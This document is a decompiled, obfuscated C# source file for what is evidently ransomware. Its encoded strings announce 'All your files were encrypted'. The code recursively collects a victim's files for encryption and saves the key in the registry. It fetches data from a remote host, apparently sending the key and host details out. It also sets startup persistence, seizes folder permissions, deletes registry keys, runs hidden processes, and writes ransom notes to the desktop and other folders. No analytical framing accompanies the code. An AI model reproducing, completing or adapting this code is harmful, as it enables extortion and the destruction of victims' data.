								if (Directory.Exists(text6) && !YyCNsMjoVMOoP.Contains(text6) && text6 != getString_0(107397028) && text6 != getString_0(107397007) && text6 != getString_0(107396442))
								{
									YyCNsMjoVMOoP.Add(text6);
								}
							}
						}
					}
					if (text3.Contains(getString_0(107396413)))
					{
						string text7 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396400))
						{
							xUjiDYXnYV = getString_0(107396816);
						}
						else if (!string.IsNullOrEmpty(text7) && text7.ToLower() == getString_0(107396423))
						{
							xUjiDYXnYV = getString_0(107396382);
						}
					}
					if (text3.Contains(getString_0(107396377)))
					{
						string text8 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396400))
						{
							hdAepnrmnch = true;
						}
						else if (!string.IsNullOrEmpty(text8) && text8.ToLower() == getString_0(107396423))
						{
							hdAepnrmnch = true;
						}
					}
					if (text3.Contains(getString_0(107396392)))
					{
						string text9 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396400))
						{
							MvyzXvhzMsIEWT = true;
						}
						else if (!string.IsNullOrEmpty(text9) && text9.ToLower() == getString_0(107396423))
						{
							MvyzXvhzMsIEWT = false;
						}
					}
					if (text3.Contains(getString_0(107396347)))
					{
						string text10 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396400))
						{
							kwNUHYKFODh = true;
						}
						else if (!string.IsNullOrEmpty(text10) && text10.ToLower() == getString_0(107396423))
						{
							kwNUHYKFODh = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(knClGxGTQzcKgW, getString_0(107396318) + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (xUjiDYXnYV == getString_0(107396382))
		{
			LyaQDxUieMw();
		}
		if (MGTkXQOIDkk)
		{
			try
			{
				Console.WriteLine(getString_0(107396273));
				fozJKOQcYVNoFOF.TFIzvfjzsygjvd();
			}
			catch (Exception ex8)
			{
				if (MvyzXvhzMsIEWT)
				{
					try
					{
						File.AppendAllText(knClGxGTQzcKgW, getString_0(107396220) + ex8.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && bdKOcjKUUjHwlc)
			{
				try
				{
					Thread thread4 = new Thread(vikzfwNFDDTSdEIQ.PlCTmRCbxDzV);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			mFLmLCPYHuB(getString_0(107396719), ZvzUuZdcuZvZyuA(getString_0(107396706)));
		}
		SecureString secureString = new SecureString();
		if (DoejNTXBreRUtu == getString_0(107396382))
		{
			MmaHtQgyFtb = COHaNSLBjuDxHFZgW.zPVjtudhZgOqH(32);
			zSiinLyeiNOaQic = COHaNSLBjuDxHFZgW.POLqBalRuwH();
		}
		else
		{
			MmaHtQgyFtb = getString_0(107396601);
		}
		VDLcytKbuzTj = wAtanfYbhauOuKP.MvqOeoNjtEKI(MmaHtQgyFtb + zSiinLyeiNOaQic);
		if (!dludHStvHyTu)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ZvzUuZdcuZvZyuA(getString_0(107396588)));
				if (registryKey != null)
				{
					registryKey.SetValue(ZvzUuZdcuZvZyuA(getString_0(107396511)) + (registryKey.ValueCount + 1), VDLcytKbuzTj);
					registryKey.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey2 = Registry.CurrentUser.CreateSubKey(ZvzUuZdcuZvZyuA(getString_0(107396588)));
				if (registryKey2 != null && registryKey2.ValueCount == 0)
				{
					registryKey2.SetValue(ZvzUuZdcuZvZyuA(getString_0(107396511)) + (registryKey2.ValueCount + 1), VDLcytKbuzTj);
					registryKey2.Close();
				}
				else if (registryKey2 != null && registryKey2.ValueCount != 0)
				{
					registryKey2.Close();
				}
			}
			catch (Exception)
			{
			}
		}
		if (peHZbsiUHe == getString_0(107396816))
		{
			jYbaqZLwDYs();
		}
		if (pcwRfMRGnwC)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), WkbYpntLeHaVcf)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), WkbYpntLeHaVcf), string.Concat(ZvzUuZdcuZvZyuA(getString_0(107396502)), new WebClient().DownloadString(ZvzUuZdcuZvZyuA(getString_0(107396477))), getString_0(107395924), ZvzUuZdcuZvZyuA(getString_0(107395951)), DateTime.Now, getString_0(107395924), ZvzUuZdcuZvZyuA(getString_0(107395910)), VDLcytKbuzTj));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), WkbYpntLeHaVcf), getString_0(107395853) + VDLcytKbuzTj);
				}
			}
			catch (Exception ex13)
			{
				if (MvyzXvhzMsIEWT)
				{
					try
					{
						File.AppendAllText(knClGxGTQzcKgW, getString_0(107395792) + ex13.Message + getString_0(107395924));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		sprWyJzbETYf.dxmlUtrponbqr(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), hdtcmoyGEV), BibwqCoyfRe(VDLcytKbuzTj), null, null, getString_0(107395743), getString_0(107395758), null);
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			aGwtOoMgGMuO();
		}
		try
		{
			try
			{
				if (hdAepnrmnch)
				{
					Console.WriteLine(getString_0(107395709));
				}
			}
			catch
			{
			}
			jhWfaAEppEnwN(new string[1] { getString_0(107396204) }, new string[100]
			{
				getString_0(107396195),
				getString_0(107396158),
				getString_0(107396153),
				getString_0(107396144),
				getString_0(107396171),
				getString_0(107396166),
				getString_0(107396161),
				getString_0(107396124),
				getString_0(107396119),
				getString_0(107396114),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396095),
				getString_0(107396090),
				getString_0(107396081),
				getString_0(107396108),
				getString_0(107396103),
				getString_0(107396098),
				getString_0(107396061),
				getString_0(107396056),
				getString_0(107396079),
				getString_0(107396074),
				getString_0(107396069),
				getString_0(107396064),
				getString_0(107396027),
				getString_0(107396022),
				getString_0(107396017),
				getString_0(107396044),
				getString_0(107396039),
				getString_0(107396034),
				getString_0(107395997),
				getString_0(107395992),
				getString_0(107395987),
				getString_0(107396014),
				getString_0(107396005),
				getString_0(107396000),
				getString_0(107395963),
				getString_0(107395958),
				getString_0(107396161),
				getString_0(107395953),
				getString_0(107396119),
				getString_0(107395976),
				getString_0(107395971),
				getString_0(107395422),
				getString_0(107395417),
				getString_0(107395412),
				getString_0(107395439),
				getString_0(107395434),
				getString_0(107395429),
				getString_0(107395424),
				getString_0(107395387),
				getString_0(107395382),
				getString_0(107395377),
				getString_0(107395404),
				getString_0(107395399),
				getString_0(107395394),
				getString_0(107395357),
				getString_0(107395352),
				getString_0(107395375),
				getString_0(107395370),
				getString_0(107395361),
				getString_0(107395316),
				getString_0(107395953),
				getString_0(107395335),
				getString_0(107395294),
				getString_0(107395285),
				getString_0(107395308),
				getString_0(107395299),
				getString_0(107395258),
				getString_0(107395253),
				getString_0(107395276),
				getString_0(107395267),
				getString_0(107395226),
				getString_0(107395221),
				getString_0(107395216),
				getString_0(107395243),
				getString_0(107395238),
				getString_0(107395233),
				getString_0(107395196),
				getString_0(107395187),
				getString_0(107395214),
				getString_0(107395209),
				getString_0(107395204),
				getString_0(107395679),
				getString_0(107395674),
				getString_0(107395665),
				getString_0(107395688),
				getString_0(107395683),
				getString_0(107395987),
				getString_0(107395646),
				getString_0(107395641),
				getString_0(107395636),
				getString_0(107395663),
				getString_0(107395658),
				getString_0(107395649),
				getString_0(107395612),
				getString_0(107395607),
				getString_0(107395630),
				getString_0(107395625),
				getString_0(107395620)
			}, new string[0], MmaHtQgyFtb, getString_0(107395583));
		}
		catch (Exception ex15)
		{
			if (MvyzXvhzMsIEWT)
			{
				try
				{
					File.AppendAllText(knClGxGTQzcKgW, getString_0(107395570) + ex15.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545));
				streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107395512)));
				streamWriter.WriteLine(getString_0(107395924));
				streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390086)));
				streamWriter.WriteLine(VDLcytKbuzTj);
				if (AaFKnZpVmxll == getString_0(107396382))
				{
					streamWriter.WriteLine(getString_0(107395924));
					streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390565)) + Convert.ToString(bTWTPdqAFFpauU.Count));
				}
				if (mYYMBtfmlAOyF)
				{
					streamWriter.WriteLine(getString_0(107395924));
					streamWriter.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390456)));
					streamWriter.WriteLine(PpFuqDxUfCPuFpcCn.zsSYEipMaODL());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545));
				if (!text11.Contains(VDLcytKbuzTj) && !dludHStvHyTu)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545), getString_0(107390423) + VDLcytKbuzTj);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in cVxpfEOwEmPC)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395545)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545), item + getString_0(107395545), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545));
					if (!text12.Contains(VDLcytKbuzTj) && !dludHStvHyTu)
					{
						File.AppendAllText(item + getString_0(107395545), getString_0(107390423) + VDLcytKbuzTj);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!qyQHkbOmTCffuf && num > 10)
			{
				break;
			}
		}
		if (nVMXzpSiOWw == getString_0(107396816))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390394)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390394));
					streamWriter2.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390361)));
					streamWriter2.WriteLine(getString_0(107395924));
					streamWriter2.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390376)));
					streamWriter2.WriteLine(VDLcytKbuzTj + ZvzUuZdcuZvZyuA(getString_0(107389775)));
					if (AaFKnZpVmxll == getString_0(107396382))
					{
						streamWriter2.WriteLine(getString_0(107395924));
						streamWriter2.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107389762)) + ZvzUuZdcuZvZyuA(getString_0(107390565)) + Convert.ToString(bTWTPdqAFFpauU.Count) + ZvzUuZdcuZvZyuA(getString_0(107389775)));
					}
					if (mYYMBtfmlAOyF)
					{
						streamWriter2.WriteLine(getString_0(107395924));
						streamWriter2.WriteLine(ZvzUuZdcuZvZyuA(getString_0(107390456)));
						streamWriter2.WriteLine(PpFuqDxUfCPuFpcCn.zsSYEipMaODL());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545));
					if (!text13.Contains(VDLcytKbuzTj) && !dludHStvHyTu)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390394), ZvzUuZdcuZvZyuA(getString_0(107389762)) + getString_0(107390423) + VDLcytKbuzTj + ZvzUuZdcuZvZyuA(getString_0(107389775)));
					}
				}
			}
			catch
			{
			}
		}
		if (VXFFPDYcDmttpVY == getString_0(107396816))
		{
			try
			{
				if (AaFKnZpVmxll == getString_0(107396382))
				{
					PpFuqDxUfCPuFpcCn.ooOKBAfijtpYELQ(getString_0(107389701), getString_0(107389696), getString_0(107389651), string.Concat(ZvzUuZdcuZvZyuA(getString_0(107396502)), new WebClient().DownloadString(ZvzUuZdcuZvZyuA(getString_0(107396477))), getString_0(107389674), ZvzUuZdcuZvZyuA(getString_0(107395951)), DateTime.Now, getString_0(107395924), ZvzUuZdcuZvZyuA(getString_0(107389669)), Convert.ToString(bTWTPdqAFFpauU.Count), getString_0(107395924), ZvzUuZdcuZvZyuA(getString_0(107395910)), VDLcytKbuzTj));
				}
				else
				{
					PpFuqDxUfCPuFpcCn.ooOKBAfijtpYELQ(getString_0(107389701), getString_0(107389696), getString_0(107389651), string.Concat(ZvzUuZdcuZvZyuA(getString_0(107396502)), new WebClient().DownloadString(ZvzUuZdcuZvZyuA(getString_0(107396477))), getString_0(107389674), ZvzUuZdcuZvZyuA(getString_0(107395951)), DateTime.Now, getString_0(107395924), ZvzUuZdcuZvZyuA(getString_0(107389669)), Convert.ToString(bTWTPdqAFFpauU.Count), getString_0(107395924), ZvzUuZdcuZvZyuA(getString_0(107395910)), VDLcytKbuzTj));
				}
			}
			catch
			{
			}
		}
		if (PfamhYYvOLt == getString_0(107396816))
		{
			try
			{
				muUzGuYdOkPJ.oEbPOeTqsIeT(new Uri(getString_0(107389588)));
			}
			catch
			{
			}
		}
		if (nVMXzpSiOWw == getString_0(107396382))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545)))
				{
					Process.Start(ZvzUuZdcuZvZyuA(getString_0(107389587)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395545));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390394)))
				{
					Process.Start(ZvzUuZdcuZvZyuA(getString_0(107389562)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107390394));
				}
			}
			catch
			{
			}
		}
		if (peHZbsiUHe == getString_0(107396816))
		{
			if (yrnseMuKTJXN == getString_0(107396816) && !string.IsNullOrEmpty(vxtPpKhCdVI) && !string.IsNullOrEmpty(HadOpfWYYmVK))
			{
				gXHlzkzuAkblbW(vxtPpKhCdVI, HadOpfWYYmVK);
			}
			else
			{
				gXHlzkzuAkblbW(getString_0(107389577), getString_0(107390060));
			}
		}
		if (OhgfYyCwZIzrk != getString_0(107389826))
		{
			hlpXzbzhxGSX(OhgfYyCwZIzrk);
		}
		if (!string.IsNullOrEmpty(iLUZulQmned))
		{
			try
			{
				File.Delete(iLUZulQmned);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397066)));
			}
		}
		catch (Exception ex18)
		{
			try
			{
				File.AppendAllText(knClGxGTQzcKgW, getString_0(107389265) + ex18.Message);
			}
			catch (Exception)
			{
			}
		}
		if (MvyzXvhzMsIEWT)
		{
			try
			{
				File.AppendAllText(knClGxGTQzcKgW, getString_0(107389252));
			}
			catch (Exception)
			{
			}
		}
		if (ZpbuHbHegKdPsO == getString_0(107389207))
		{
			yExfGaYYDORBn();
		}
	}

	public static void aHAXSlbacvoez()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(ZvzUuZdcuZvZyuA(getString_0(107389230)), ZvzUuZdcuZvZyuA(getString_0(107389577)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int iZewdCSMqysZRm(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> QRCbDmMpcCOF(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107389044)) && !text.Contains(getString_0(107389531)) && !text.Contains(getString_0(107389498)) && !text.ToLower().Contains(getString_0(107389513)) && !text.ToLower().Contains(getString_0(107389468)) && !text.Contains(getString_0(107389475)) && !text.Contains(getString_0(107389454)) && !text.ToLower().Contains(getString_0(107389441)) && !text.ToLower().Contains(getString_0(107389396)) && !text.ToLower().Contains(getString_0(107389391)) && !text.ToLower().Contains(getString_0(107389382)) && !text.ToLower().Contains(getString_0(107389333)) && !text.ToLower().Contains(getString_0(107389352)) && !text.ToLower().Contains(getString_0(107389307)) && !text.ToLower().Contains(getString_0(107389318)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107388781)) && !fileInfo.FullName.Contains(getString_0(107388732)) && !fileInfo.FullName.Contains(getString_0(107388747)) && !fileInfo.FullName.Contains(getString_0(107388698)) && !fileInfo.FullName.Contains(getString_0(107388713)) && !fileInfo.FullName.Contains(getString_0(107388664)) && !fileInfo.FullName.Contains(getString_0(107388679)) && !fileInfo.FullName.Contains(getString_0(107388630)) && !fileInfo.FullName.Contains(getString_0(107388649)) && !fileInfo.FullName.Contains(getString_0(107388596)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388615)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388570)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388585)) && !fileInfo.FullName.ToLower().Contains(getString_0(107388536)) && !fileInfo.FullName.Contains(ZvzUuZdcuZvZyuA(getString_0(107388551))) && !fileInfo.FullName.Contains(getString_0(107389038)) && !fileInfo.FullName.Contains(getString_0(107397066)) && !fileInfo.FullName.Contains(getString_0(107389025)) && !fileInfo.FullName.EndsWith(getString_0(107395583)) && !fileInfo.FullName.EndsWith(getString_0(107389000)) && !fileInfo.FullName.EndsWith(getString_0(107388995)) && !fileInfo.FullName.EndsWith(getString_0(107388958)) && !fileInfo.FullName.EndsWith(getString_0(107388953)) && !fileInfo.FullName.Contains(getString_0(107388948)) && !fileInfo.FullName.Contains(hdtcmoyGEV) && !fileInfo.FullName.Contains(knClGxGTQzcKgW) && !fileInfo.FullName.Contains(WkbYpntLeHaVcf))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(rMzUuGRFsemZwV) * 1024.0 * 1024.0 && SUzteLfaPqYT == getString_0(107396816))
						{
							list.Add(fileInfo.FullName);
							ySmKxcFKUvGO(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && SUzteLfaPqYT == getString_0(107396382))
						{
							list.Add(fileInfo.FullName);
							ySmKxcFKUvGO(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void LyaQDxUieMw()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107388963));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!YyCNsMjoVMOoP.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388910), getString_0(107396738)).Replace(getString_0(107388905), getString_0(107388910))
					.Replace(getString_0(107388896), getString_0(107389588))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					YyCNsMjoVMOoP.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107388910), getString_0(107396738)).Replace(getString_0(107388905), getString_0(107388910))
						.Replace(getString_0(107388896), getString_0(107389588))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107388859), getString_0(107389588)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string mFLmLCPYHuB(string tohyEbaUhpDAqq = "", string XQsixlauBcikI = "")
	{
		string result = getString_0(107389588);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = tohyEbaUhpDAqq,
				Arguments = XQsixlauBcikI,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void uVVdsjGVrGks(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107388850),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string gZenGKRaZbbcTPvN(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string ZvzUuZdcuZvZyuA(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void qIwkSuJzDYBt(string XZurNRopKNqnbFHjc = "", string URZxUwgtIPmqh = "SW5mb3JtYXRpb24uLi4=", string ZmBfDvnRedpmJsp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		XZurNRopKNqnbFHjc = gZenGKRaZbbcTPvN(getString_0(107388865));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZvzUuZdcuZvZyuA(XZurNRopKNqnbFHjc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(ZvzUuZdcuZvZyuA(getString_0(107388256)), ZvzUuZdcuZvZyuA(URZxUwgtIPmqh));
				registryKey.SetValue(ZvzUuZdcuZvZyuA(getString_0(107388191)), ZvzUuZdcuZvZyuA(ZmBfDvnRedpmJsp));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			XZurNRopKNqnbFHjc = gZenGKRaZbbcTPvN(getString_0(107388194));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZvzUuZdcuZvZyuA(XZurNRopKNqnbFHjc), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(ZvzUuZdcuZvZyuA(getString_0(107388057)), ZvzUuZdcuZvZyuA(URZxUwgtIPmqh));
				registryKey.SetValue(ZvzUuZdcuZvZyuA(getString_0(107388024)), ZvzUuZdcuZvZyuA(ZmBfDvnRedpmJsp));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void jYbaqZLwDYs()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (yrnseMuKTJXN == getString_0(107396816) && !string.IsNullOrEmpty(vxtPpKhCdVI) && !string.IsNullOrEmpty(HadOpfWYYmVK))
				{
					qIwkSuJzDYBt(getString_0(107389588), vxtPpKhCdVI, HadOpfWYYmVK);
				}
				else
				{
					qIwkSuJzDYBt(getString_0(107389588), getString_0(107389577), getString_0(107390060));
				}
			}
		}
		catch
		{
		}
	}

	public static void gXHlzkzuAkblbW(string RAekkLcrtkJuJ = "SW5mb3JtYXRpb24uLi4=", string JlPCHLEEvR = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(ZvzUuZdcuZvZyuA(RAekkLcrtkJuJ));
		val.set_BalloonTipText(ZvzUuZdcuZvZyuA(JlPCHLEEvR));
		val.ShowBalloonTip(30000);
	}

	public static void hlpXzbzhxGSX(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		mFLmLCPYHuB(ZvzUuZdcuZvZyuA(getString_0(107388507)), getString_0(107388522) + text + getString_0(107388513) + string_0);
	}

	public static void mDTyZTitOnZ(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = ZvzUuZdcuZvZyuA(getString_0(107388476));
		processStartInfo.Arguments = getString_0(107388447) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool NEtTtiYUXuvT(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool HNCtPnvTGiWcK(string string_0)
	{
		try
		{
			YMOBZpyLGbSHkV CS_0024_003C_003E8__locals0 = new YMOBZpyLGbSHkV();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.pvghbFRCdmIVk = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.pvghbFRCdmIVk);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107388442);
		}
		catch
		{
			return false;
		}
	}

	public static void FUFyRGutBoJe()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = gZenGKRaZbbcTPvN(getString_0(107388433));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(ZvzUuZdcuZvZyuA(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107388327)));
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107388302)));
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107387741)));
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107387748)));
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107388476)));
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107387723)));
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107388507)));
					registryKey.Close();
				}
				string_ = gZenGKRaZbbcTPvN(getString_0(107387694));
				registryKey = Registry.LocalMachine.OpenSubKey(ZvzUuZdcuZvZyuA(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107387597)));
					registryKey.Close();
				}
				string_ = gZenGKRaZbbcTPvN(getString_0(107387548));
				registryKey = Registry.LocalMachine.OpenSubKey(ZvzUuZdcuZvZyuA(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(ZvzUuZdcuZvZyuA(getString_0(107387597)));
					registryKey.Close();
				}
				string_ = gZenGKRaZbbcTPvN(getString_0(107387548));
				registryKey = Registry.CurrentUser.OpenSubKey(ZvzUuZdcuZvZyuA(string_), writable: true);
